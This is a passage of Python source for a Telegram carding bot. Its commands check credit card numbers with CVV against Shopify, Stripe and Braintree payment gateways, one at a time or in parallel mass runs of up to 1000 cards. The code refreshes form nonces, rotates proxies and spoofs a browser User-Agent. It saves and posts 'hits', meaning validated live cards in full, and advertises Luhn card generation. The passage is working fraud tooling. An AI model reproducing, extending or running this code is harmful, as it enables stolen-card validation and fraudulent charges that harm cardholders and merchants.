        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)

@bot.message_handler(commands=['siteinfo'])
def siteinfo_command(message):
    sites = load_sites()
    if not sites:
        bot.reply_to(message, "❌ No sites loaded")
        return
    perm_sites = sqlite_backup.get_permanent_sites()
    response = f"🌐 *Site Dashboard*\n{LINE_DASH}\n"
    response += f"📊 Total sites: {len(sites)}\n"
    response += f"🔒 Permanent: {len(perm_sites)}\n"
    response += f"🔓 Regular: {len(sites) - len([s for s in sites if sqlite_backup.is_permanent_site(s)])}\n"
    if site_stats:
        best_sites = []
        worst_sites = []
        for url, (total, success) in site_stats.items():
            if total >= SITE_MIN_CHECKS:
                rate = success / total
                best_sites.append((url, rate, total))
                worst_sites.append((url, rate, total))
        best_sites.sort(key=lambda x: x[1], reverse=True)
        worst_sites.sort(key=lambda x: x[1])
        if best_sites[:3]:
            response += f"\n🏆 *Best Sites*:\n"
            for url, rate, total in best_sites[:3]:
                domain = re.sub(r'https?://', '', url).split('/')[0]
                response += f"  🟢 {domain} ({rate:.0%}, {total} checks)\n"
        if worst_sites[:3]:
            response += f"\n⚠️ *Worst Sites*:\n"
            for url, rate, total in worst_sites[:3]:
                domain = re.sub(r'https?://', '', url).split('/')[0]
                response += f"  🔴 {domain} ({rate:.0%}, {total} checks)\n"
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
    except:
        bot.reply_to(message, response.replace('*', ''))

# ============================================
# COMMANDS
# ============================================

@bot.message_handler(commands=['myid'])
def myid_command(message):
    bot.reply_to(message, f"🆔 Your Telegram ID: `{message.from_user.id}`\n\nSend this ID to the bot admin to get access.", parse_mode='Markdown')

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome_text = f"""
╔══════════════════════════════╗
   🤖 *{BOT_NAME} {BOT_VERSION}*
   ⚡ Shopify + Stripe Auth + Stripe Charge $10
╚══════════════════════════════╝

🛒 *━━ SHOPIFY GATEWAY ━━*
  /chk `cc|mm|yy|cvv` ─ Single check
  /mass ─ Mass check (pipeline)

🔓 *━━ STRIPE AUTH (FREE) ━━*
  /au `cc|mm|yy|cvv` ─ Single check
  /mau ─ Mass check (pipeline)

💳 *━━ STRIPE CHARGE $10 ━━*
  /sc `cc|mm|yy|cvv` ─ Single check
  /msc ─ Mass check (pipeline)

🏦 *━━ UTILITIES ━━*
  /bin `424242` ─ BIN lookup
  /gen `424242` `10` ─ Generate cards (Luhn)
  /cardinfo `cc|mm|yy|cvv` ─ Validate card
  /px ─ Deep proxy check (3 levels)
  /addproxy `IP:PORT` ─ Add proxy
  /testsite `URL` ─ Test site status

🧹 *━━ MAINTENANCE ━━*
  /dedup ─ Remove duplicate cards
  /cleanexp ─ Remove expired cards
  /proxyinfo ─ Proxy dashboard
  /siteinfo ─ Site dashboard

⚙️ *━━ SETTINGS ━━*
  /stats ─ Statistics
  /mode ─ Parallel mode (1x/3x/5x)

{LINE_THIN}
📂 *Send .txt file to auto-load*
🧹 *Auto-maintenance active*
"""
    safe_send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=get_main_keyboard())

@bot.message_handler(commands=['chk'])
def chk_command(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Format: /chk cc|mm|yy|cvv")
        return
    card_str = args[1]
    if '|' not in card_str and len(args) >= 5:
        card_str = f"{args[1]}|{args[2]}|{args[3]}|{args[4]}"
    parts = card_str.split('|')
    if len(parts) < 4:
        bot.reply_to(message, "❌ Invalid format. Use: cc|mm|yy|cvv")
        return
    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    if not cc.isdigit() or len(cc) < 13:
        bot.reply_to(message, "❌ Invalid card number")
        return
    
    processing_msg = bot.reply_to(message, "⏳ Checking card with Shopify...")
    
    bin_info = bin_lookup(cc[:6])
    category, status_msg, response_msg, price, gateway, elapsed, site_used = check_card_shopify(cc, month, year, cvv)
    card_data = {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}
    response = format_chk_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info)
    
    if category in ['CHARGE', '3DS', 'CVV', 'FUNDS']:
        hit_data = {
            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
            'category': category, 'status_msg': response_msg,
            'gateway': gateway, 'price': price, 'elapsed': elapsed,
            'bin_info': bin_info,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_hit(hit_data)
    
    try:
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)

@bot.message_handler(commands=['au'])
def stripe_command(message):
    """Comando /au - Check individual con Stripe Auth"""
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Format: /au cc|mm|yy|cvv")
        return
    card_str = args[1]
    if '|' not in card_str and len(args) >= 5:
        card_str = f"{args[1]}|{args[2]}|{args[3]}|{args[4]}"
    parts = card_str.split('|')
    if len(parts) < 4:
        bot.reply_to(message, "❌ Invalid format. Use: cc|mm|yy|cvv")
        return
    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    
    processing_msg = bot.reply_to(message, "🔓 *Checking with Stripe Auth Gateway (FREE)...*\n⏳ Please wait...", parse_mode='Markdown')
    
    bin_info = bin_lookup(cc[:6])
    category, status_msg, response_msg, price, gateway, elapsed = check_stripe_auth(cc, month, year, cvv)
    card_data = {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}
    response = format_stripe_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info)
    
    if category in ['LIVE', '3DS', 'CVV']:
        hit_data = {
            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
            'category': category, 'status_msg': status_msg,
            'response_msg': response_msg,
            'gateway': gateway, 'price': price, 'elapsed': elapsed,
            'bin_info': bin_info,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_stripe_hit(hit_data)
    
    try:
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)

# ============================================
# STRIPE CHARGE INDIVIDUAL COMMAND
# ============================================

@bot.message_handler(commands=['sc'])
def sc_command(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Format: /sc cc|mm|yy|cvv")
        return
    card_str = args[1]
    if '|' not in card_str and len(args) >= 5:
        card_str = f"{args[1]}|{args[2]}|{args[3]}|{args[4]}"
    parts = card_str.split('|')
    if len(parts) < 4:
        bot.reply_to(message, "❌ Invalid format. Use: cc|mm|yy|cvv")
        return
    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    if not cc.isdigit() or len(cc) < 13:
        bot.reply_to(message, "❌ Invalid card number")
        return
    
    processing_msg = bot.reply_to(message, "💳 *Checking with Stripe Charge $10 Gateway...*\n⏳ Please wait...", parse_mode='Markdown')
    
    bin_info = bin_lookup(cc[:6])
    category, status_msg, response_msg, price, gateway, elapsed = check_stripe_charge(cc, month, year, cvv)
    card_data = {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}
    response = format_sc_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info)
    
    if category in ['CHARGE', '3DS', 'CVV', 'FUNDS']:
        hit_data = {
            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
            'category': category, 'status_msg': status_msg,
            'response_msg': response_msg,
            'gateway': gateway, 'price': price, 'elapsed': elapsed,
            'bin_info': bin_info,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_sc_hit(hit_data)
    
    try:
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)

# ============================================
# BRAINTREE AUTH INDIVIDUAL COMMAND
# ============================================

@bot.message_handler(commands=['b3'])
def b3_command(message):
    global b3_http_session, b3_auth_fp, b3_apm_nonce, b3_config_data
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Format: /b3 cc|mm|yy|cvv")
        return
    card_str = args[1]
    if '|' not in card_str and len(args) >= 5:
        card_str = f"{args[1]}|{args[2]}|{args[3]}|{args[4]}"
    parts = card_str.split('|')
    if len(parts) < 4:
        bot.reply_to(message, "❌ Invalid format. Use: cc|mm|yy|cvv")
        return
    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    if not cc.isdigit() or len(cc) < 13:
        bot.reply_to(message, "❌ Invalid card number")
        return
    
    processing_msg = bot.reply_to(message, "💳 *Checking with Braintree Auth $0 Gateway...*\n⏳ Please wait...", parse_mode='Markdown')
    
    bin_info = bin_lookup(cc[:6])
    result = check_braintree_auth(cc, month, year, cvv, session=b3_http_session, auth_fp=b3_auth_fp, apm_nonce=b3_apm_nonce, config_data=b3_config_data)
    category, status_msg, response_msg, price, gateway, elapsed, b3_http_session, b3_auth_fp, b3_apm_nonce, b3_config_data = result
    card_data = {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}
    response = format_b3_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info)
    
    if category in ['LIVE', '3DS', 'CVV']:
        hit_data = {
            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
            'category': category, 'status_msg': status_msg,
            'response_msg': response_msg,
            'gateway': gateway, 'price': price, 'elapsed': elapsed,
            'bin_info': bin_info,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_b3_hit(hit_data)
    
    try:
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)

# ============================================
# STRIPE CHARGE MASS CHECK
# ============================================

@bot.message_handler(commands=['msc'])
def sc_mass_command(message):
    global sc_mass_running, stop_mass_flag, current_mass_msg, current_mass_chat_id, mass_paused
    
    if mass_check_running or stripe_mass_running or sc_mass_running:
        bot.reply_to(message, "⚠️ A mass check is already in progress. Use STOP button or /stop")
        return
    
    cards = get_all_sc_cards()
    if not cards:
        bot.reply_to(message, "❌ No Stripe Charge $10 cards saved. Send a .txt file (name with 'charge' or 'sc').")
        return
    
    total = len(cards)
    if total > 1000:
        bot.reply_to(message, f"⚠️ Found {total} CCs in file\nProcessing only first 1000 CCs\n1000 CCs will be checked")
        cards = cards[:1000]
        total = 1000
    
    stop_mass_flag = False
    mass_paused = False
    sc_mass_running = True
    
    control_buttons = InlineKeyboardMarkup(row_width=1)
    control_buttons.add(
        InlineKeyboardButton("🛑 DETENER MASS CHECK", callback_data="stop_mass")
    )
    
    progress_bar = create_progress_bar(0, total)
    msg_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *STRIPE CHARGE $10 MASS CHECK (1x)*

`{progress_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💳 *Card:* `WAITING...`
📝 *Response:* `CONNECTING...`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💰 Charge: *0*  │  ✅ Approved: *0*
❌ Declined: *0*  │  📊 `[0/{total}]`"""
    
    progress_msg = safe_send_message(message.chat.id, msg_text, parse_mode='Markdown', reply_markup=control_buttons)
    
    current_mass_msg = progress_msg
    current_mass_chat_id = message.chat.id
    
    def run_sc_mass(chat_id, msg_id):
        global sc_mass_running, stop_mass_flag
        
        try:
            _run_sc_mass_inner(chat_id, msg_id)
        finally:
            sc_mass_running = False
            stop_mass_flag = False
    
    def _run_sc_mass_inner(chat_id, msg_id):
        global sc_mass_running, stop_mass_flag
        
        # Create session and fetch initial nonce for mass check
        mass_session = requests.Session()
        mass_session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
        })
        mass_form_hash = sc_fetch_form_nonce(mass_session)
        
        stats = {
            'charge': 0, 'threeds': 0, 'cvv': 0, 'funds': 0,
            'declined': 0, 'errors': 0, 'total': total
        }
        
        completed = 0
        last_card = "WAITING..."
        last_response = "CONNECTING..."
        last_price = "N/A"
        cards_since_nonce = [0]  # mutable counter for nonce refresh
        
        task_queue = Queue()
        result_queue = Queue()
        
        for card_str in cards:
            task_queue.put(card_str)
        
        for _ in range(SC_PARALLEL_WORKERS):
            task_queue.put(None)
        
        def sc_worker(worker_id):
            nonlocal mass_form_hash
            while not stop_mass_flag:
                if mass_paused:
                    time.sleep(1)
                    continue
                try:
                    card_str = task_queue.get(timeout=1)
                    if card_str is None:
                        break
                    
                    # Refresh nonce every 5 cards (like original script)
                    cards_since_nonce[0] += 1
                    if cards_since_nonce[0] > 1 and (cards_since_nonce[0] - 1) % 5 == 0:
                        mass_form_hash = sc_fetch_form_nonce(mass_session)
                    
                    parts = card_str.split('|')
                    if len(parts) < 4:
                        result_queue.put(('error', card_str, None, worker_id))
                        continue
                    
                    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
                    bin_info = bin_lookup(cc[:6])
                    result = check_stripe_charge(cc, month, year, cvv, session=mass_session, form_hash=mass_form_hash)
                    result_queue.put(('success', card_str, result, worker_id, cc, month, year, cvv, bin_info))
                except:
                    continue
        
        workers = []
        for i in range(SC_PARALLEL_WORKERS):
            w = threading.Thread(target=sc_worker, args=(i,))
            w.daemon = True
            w.start()
            workers.append(w)
        
        processed_cards = set()
        update_counter = 0
        
        def send_update():
            nonlocal last_card, last_response, last_price, update_counter
            
            total_approved = stats['charge'] + stats['threeds'] + stats['cvv'] + stats['funds']
            
            if update_counter % 5 == 0 or update_counter == 0 or completed == total:
                progress_bar = create_progress_bar(completed, total)
                update_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *STRIPE CHARGE $10 MASS CHECK (1x)*

`{progress_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💳 *Card:* `{last_card}`
📝 *Response:* `{last_response}`
💲 *Price:* `{last_price}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💰 Charge: *{stats['charge']}*  │  ✅ Approved: *{total_approved}*
❌ Declined: *{stats['declined']}*  │  📊 `[{completed}/{total}]`"""
                
                if not stop_mass_flag:
                    try:
                        bot.edit_message_text(update_text, chat_id=chat_id, message_id=msg_id,
                                            parse_mode='Markdown', reply_markup=control_buttons)
                    except:
                        pass
        
        start_time = time.time()
        
        while completed < total and not stop_mass_flag:
            try:
                result_data = result_queue.get(timeout=0.5)
                
                if result_data[0] == 'error':
                    card_str = result_data[1]
                    if card_str in processed_cards:
                        continue
                    processed_cards.add(card_str)
                    completed += 1
                    stats['errors'] += 1
                    delete_sc_card(card_str)
                    update_counter += 1
                    send_update()
                else:
                    _, card_str, result, worker_id, cc, month, year, cvv, bin_info = result_data
                    
                    if card_str in processed_cards:
                        continue
                    processed_cards.add(card_str)
                    
                    category, status_msg, response_msg, price, gateway, elapsed = result
                    
                    last_card = f"{cc[:6]}******{cc[-4:]}"
                    last_response = response_msg if response_msg else status_msg
                    last_price = price
                    
                    if category in ['CHARGE', '3DS', 'CVV', 'FUNDS']:
                        if category == 'CHARGE':
                            stats['charge'] += 1
                        elif category == '3DS':
                            stats['threeds'] += 1
                        elif category == 'CVV':
                            stats['cvv'] += 1
                        elif category == 'FUNDS':
                            stats['funds'] += 1
                        
                        icon, cat_display, dot = get_status_emoji(category)
                        hit_msg = f"""{dot} *STRIPE CHARGE $10 ─ APPROVED* {dot}
{LINE_THIN}
💳 `{cc}|{month}|{year}|{cvv}`
🌐 {gateway}
📝 {response_msg}
💲 {price}
{LINE_THIN}"""
                        
                        try:
                            bot.send_message(chat_id, hit_msg, parse_mode='Markdown')
                        except:
                            bot.send_message(chat_id, hit_msg.replace('`', '').replace('*', ''))
                        
                        hit_data = {
                            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
                            'category': category, 'status_msg': response_msg,
                            'response_msg': response_msg,
                            'gateway': gateway, 'price': price, 'elapsed': elapsed,
                            'bin_info': bin_info,
                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        }
                        save_sc_hit(hit_data)
                    elif category == 'DECLINED':
                        stats['declined'] += 1
                    else:
                        stats['errors'] += 1
                    
                    completed += 1
                    delete_sc_card(card_str)
                    update_counter += 1
                    send_update()
                    
            except:
                continue
        
        for w in workers:
            try:
                w.join(timeout=2)
            except:
                pass
        
        elapsed = time.time() - start_time
        minutes, seconds = int(elapsed // 60), int(elapsed % 60)
        total_approved = stats['charge'] + stats['threeds'] + stats['cvv'] + stats['funds']
        
        try:
            sqlite_backup.update_daily_stats(completed, total_approved, stats['declined'], stats['errors'], 0, 0, current_mode)
        except:
            pass
        
        was_stopped = stop_mass_flag
        status_label = "🛑 *MASS CHECK STOPPED*" if was_stopped else "🏁 *MASS CHECK COMPLETED*"
        
        final_bar = create_progress_bar(completed, total)
        final_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{status_label}

`{final_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💰 *Charge:* {stats['charge']}
✅ *Approved:* {total_approved}
❌ *Declined:* {stats['declined']}
📊 *Total:* {completed}
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⏱ *Time:* {minutes}m {seconds}s"""
        
        result_keyboard = InlineKeyboardMarkup()
        result_keyboard.row(
            InlineKeyboardButton("🏆 Ver Hits", callback_data="sc_hits"),
            InlineKeyboardButton("📦 Nuevo Mass", callback_data="sc_mass")
        )
        
        try:
            bot.edit_message_text(final_text, chat_id=chat_id, message_id=msg_id,
                                parse_mode='Markdown', reply_markup=result_keyboard)
        except:
            pass
    
    t = threading.Thread(target=run_sc_mass, args=(message.chat.id, progress_msg.message_id))
    t.daemon = True
    t.start()

# ============================================
# STRIPE CHARGE HITS & CLEAR COMMANDS
# ============================================

@bot.message_handler(commands=['schits'])
def sc_hits_command(message):
    hits = get_sc_hits()
    if not hits:
        bot.reply_to(message, "❌ No Stripe Charge $10 hits yet")
        return
    response = f"💳 *{BOT_NAME} ─ STRIPE CHARGE $10 HITS ({len(hits)})*\n{LINE_DASH}\n\n"
    for i, hit in enumerate(hits[-20:], 1):
        cc = hit.get('cc', '?')
        month = hit.get('month', '?')
        year = hit.get('year', '?')
        cvv = hit.get('cvv', '?')
        cat = hit.get('category', '?')
        icon, _, dot = get_status_emoji(cat)
        response += f"  {dot} `{cc}|{month}|{year}|{cvv}`\n"
        response += f"     └─ {icon} {cat}\n"
    response += f"\n{LINE_THIN}\n📊 Total hits: *{len(hits)}*"
    safe_send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['clearsc'])
def clear_sc_command(message):
    count = len(get_all_sc_cards())
    clear_sc_cards()
    response = f"""🗑️ *{BOT_NAME} ─ STRIPE CHARGE CARDS DELETED*
{LINE_THIN}
💳 *Cards deleted:* {count}
📊 *Remaining:* 0

💡 Send a new `.txt` file (name with 'charge' or 'sc') to load more cards"""
    safe_send_message(message.chat.id, response, parse_mode='Markdown')

# ============================================
# BRAINTREE AUTH MASS CHECK (1x - SEQUENTIAL)
# ============================================

@bot.message_handler(commands=['mb3'])
def b3_mass_command(message):
    global b3_mass_running, stop_mass_flag, current_mass_msg, current_mass_chat_id, mass_paused, b3_http_session, b3_auth_fp
    
    if mass_check_running or stripe_mass_running or sc_mass_running or b3_mass_running:
        bot.reply_to(message, "⚠️ A mass check is already in progress. Use STOP button or /stop")
        return
    
    cards = get_all_b3_cards()
    if not cards:
        bot.reply_to(message, "❌ No Braintree Auth cards saved. Send a .txt file and select Braintree Auth.")
        return
    
    total = len(cards)
    if total > 1000:
        bot.reply_to(message, f"⚠️ Found {total} CCs in file\nProcessing only first 1000 CCs\n1000 CCs will be checked")
        cards = cards[:1000]
        total = 1000
    
    stop_mass_flag = False
    mass_paused = False
    b3_mass_running = True
    
    control_buttons = InlineKeyboardMarkup(row_width=1)
    control_buttons.add(
        InlineKeyboardButton("🛑 DETENER MASS CHECK", callback_data="stop_mass")
    )
    
    progress_bar = create_progress_bar(0, total)
    msg_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *BRAINTREE AUTH $0 MASS CHECK (1x)*

`{progress_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💳 *Card:* `WAITING...`
📝 *Response:* `CONNECTING...`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💰 Live: *0*  │  ✅ Approved: *0*
❌ Declined: *0*  │  📊 `[0/{total}]`"""
    
    progress_msg = safe_send_message(message.chat.id, msg_text, parse_mode='Markdown', reply_markup=control_buttons)
    
    current_mass_msg = progress_msg
    current_mass_chat_id = message.chat.id
    
    def run_b3_mass(chat_id, msg_id):
        global b3_mass_running, stop_mass_flag
        
        try:
            _run_b3_mass_inner(chat_id, msg_id)
        finally:
            b3_mass_running = False
            stop_mass_flag = False
    
    def _run_b3_mass_inner(chat_id, msg_id):
        global b3_mass_running, stop_mass_flag
        
        b3_init_session_pool()
        
        stats = {
            'live': 0, 'threeds': 0, 'cvv': 0,
            'declined': 0, 'errors': 0, 'total': total
        }
        
        completed = 0
        last_card = "WAITING..."
        last_response = "CONNECTING..."
        last_price = "N/A"
        
        task_queue = Queue()
        result_queue = Queue()
        
        for card_str in cards:
            task_queue.put(card_str)
        
        for _ in range(B3_PARALLEL_WORKERS):
            task_queue.put(None)
        
        def b3_worker(worker_id):
            while not stop_mass_flag:
                if mass_paused:
                    time.sleep(1)
                    continue
                try:
                    card_str = task_queue.get(timeout=1)
                    if card_str is None:
                        break
                    
                    parts = card_str.split('|')
                    if len(parts) < 4:
                        result_queue.put(('error', card_str, None, worker_id))
                        continue
                    
                    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
                    bin_info = bin_lookup(cc[:6])
                    result = check_braintree_auth(cc, month, year, cvv, use_pool=True)
                    category, status_msg, response_msg, price, gateway, elapsed, _, _, _, _ = result
                    result_queue.put(('success', card_str, (category, status_msg, response_msg, price, gateway, elapsed), worker_id, cc, month, year, cvv, bin_info))
                except:
                    continue
        
        workers = []
        for i in range(B3_PARALLEL_WORKERS):
            w = threading.Thread(target=b3_worker, args=(i,))
            w.daemon = True
            w.start()
            workers.append(w)
        
        processed_cards = set()
        update_counter = 0
        
        def send_update():
            nonlocal last_card, last_response, last_price, update_counter
            
            total_approved = stats['live'] + stats['threeds'] + stats['cvv']
            
            if update_counter % 5 == 0 or update_counter == 0 or completed == total:
                progress_bar = create_progress_bar(completed, total)
                update_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *BRAINTREE AUTH $0 MASS CHECK (1x)*

`{progress_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💳 *Card:* `{last_card}`
📝 *Response:* `{last_response}`
💲 *Price:* `{last_price}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💰 Live: *{stats['live']}*  │  ✅ Approved: *{total_approved}*
❌ Declined: *{stats['declined']}*  │  📊 `[{completed}/{total}]`"""
                
                if not stop_mass_flag:
                    try:
                        bot.edit_message_text(update_text, chat_id=chat_id, message_id=msg_id,
                                            parse_mode='Markdown', reply_markup=control_buttons)
                    except:
                        pass
        
        start_time = time.time()
        
        while completed < total and not stop_mass_flag:
            try:
                result_data = result_queue.get(timeout=0.5)
                
                if result_data[0] == 'error':
                    card_str = result_data[1]
                    if card_str in processed_cards:
                        continue
                    processed_cards.add(card_str)
                    completed += 1
                    stats['errors'] += 1
                    delete_b3_card(card_str)
                    update_counter += 1
                    send_update()
                else:
                    _, card_str, result, worker_id, cc, month, year, cvv, bin_info = result_data
                    
                    if card_str in processed_cards:
                        continue
                    processed_cards.add(card_str)
                    
                    category, status_msg, response_msg, price, gateway, elapsed = result
                    
                    last_card = f"{cc[:6]}******{cc[-4:]}"
                    last_response = response_msg if response_msg else status_msg
                    last_price = price
                    
                    if category in ['LIVE', '3DS', 'CVV']:
                        if category == 'LIVE':
                            stats['live'] += 1
                        elif category == '3DS':
                            stats['threeds'] += 1
                        elif category == 'CVV':
                            stats['cvv'] += 1
                        
                        icon, cat_display, dot = get_status_emoji(category)
                        hit_msg = f"""{dot} *BRAINTREE AUTH $0 ─ APPROVED* {dot}
{LINE_THIN}
💳 `{cc}|{month}|{year}|{cvv}`
🌐 {gateway}
📝 {response_msg}
💲 {price}
{LINE_THIN}"""
                        
                        try:
                            bot.send_message(chat_id, hit_msg, parse_mode='Markdown')
                        except:
                            bot.send_message(chat_id, hit_msg.replace('`', '').replace('*', ''))
                        
                        hit_data = {
                            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
                            'category': category, 'status_msg': response_msg,
                            'response_msg': response_msg,
                            'gateway': gateway, 'price': price, 'elapsed': elapsed,
                            'bin_info': bin_info,
                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        }
                        save_b3_hit(hit_data)
                    elif category == 'DECLINED':
                        stats['declined'] += 1
                    else:
                        stats['errors'] += 1
                    
                    completed += 1
                    delete_b3_card(card_str)
                    update_counter += 1
                    send_update()
                    
            except:
                continue
        
        for w in workers:
            try:
                w.join(timeout=2)
            except:
                pass
        
        elapsed = time.time() - start_time
        minutes, seconds = int(elapsed // 60), int(elapsed % 60)
        total_approved = stats['live'] + stats['threeds'] + stats['cvv']
        
        try:
            sqlite_backup.update_daily_stats(completed, total_approved, stats['declined'], stats['errors'], 0, 0, current_mode)
        except:
            pass
        
        was_stopped = stop_mass_flag
        status_label = "🛑 *MASS CHECK STOPPED*" if was_stopped else "🏁 *MASS CHECK COMPLETED*"
        
        final_bar = create_progress_bar(completed, total)
        final_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{status_label}

`{final_bar}`
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
💰 *Live:* {stats['live']}
✅ *Approved:* {total_approved}
❌ *Declined:* {stats['declined']}
📊 *Total:* {completed}
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⏱ *Time:* {minutes}m {seconds}s"""
        
        result_keyboard = InlineKeyboardMarkup()
        result_keyboard.row(
            InlineKeyboardButton("🏆 Ver Hits", callback_data="b3_hits"),
            InlineKeyboardButton("📦 Nuevo Mass", callback_data="b3_mass")
        )
        
        try:
            bot.edit_message_text(final_text, chat_id=chat_id, message_id=msg_id,
                                parse_mode='Markdown', reply_markup=result_keyboard)
        except:
            pass
    
    t = threading.Thread(target=run_b3_mass, args=(message.chat.id, progress_msg.message_id))
    t.daemon = True
    t.start()

# ============================================
# BRAINTREE AUTH HITS & CLEAR COMMANDS
# ============================================

@bot.message_handler(commands=['b3hits'])
def b3_hits_command(message):
    hits = get_b3_hits()
    if not hits:
        bot.reply_to(message, "❌ No Braintree Auth hits yet")
        return
    response = f"💳 *{BOT_NAME} ─ BRAINTREE AUTH $0 HITS ({len(hits)})*\n{LINE_DASH}\n\n"
    for i, hit in enumerate(hits[-20:], 1):
        cc = hit.get('cc', '?')
        month = hit.get('month', '?')
        year = hit.get('year', '?')
        cvv = hit.get('cvv', '?')
        cat = hit.get('category', '?')
        icon, _, dot = get_status_emoji(cat)
        response += f"  {dot} `{cc}|{month}|{year}|{cvv}`\n"
        response += f"     └─ {icon} {cat}\n"
    response += f"\n{LINE_THIN}\n📊 Total hits: *{len(hits)}*"
    safe_send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['clearb3'])
def clear_b3_command(message):
    count = len(get_all_b3_cards())
    clear_b3_cards()
    response = f"""🗑️ *{BOT_NAME} ─ BRAINTREE AUTH CARDS DELETED*
{LINE_THIN}
💳 *Cards deleted:* {count}
📊 *Remaining:* 0

💡 Send a new `.txt` file and select Braintree Auth to load more cards"""
    safe_send_message(message.chat.id, response, parse_mode='Markdown')

# ============================================
# PROXY DELETE COMMAND
# ============================================

@bot.message_handler(commands=['delproxy'])
def delete_proxy_command(message):
    """Eliminar un proxy específico por índice o todos"""
    args = message.text.split()
    if len(args) < 2:
        # Mostrar lista de proxies con índices
        proxies = load_proxies()
        if not proxies:
            bot.reply_to(message, "📭 No proxies saved.")
            return
        
        response = f"📡 *{BOT_NAME} ─ PROXIES ({len(proxies)})*\n{LINE_DASH}\n\n"
        for i, proxy in enumerate(proxies, 1):
            parts = proxy.split(':')
            masked = f"{parts[0]}:{parts[1]}"
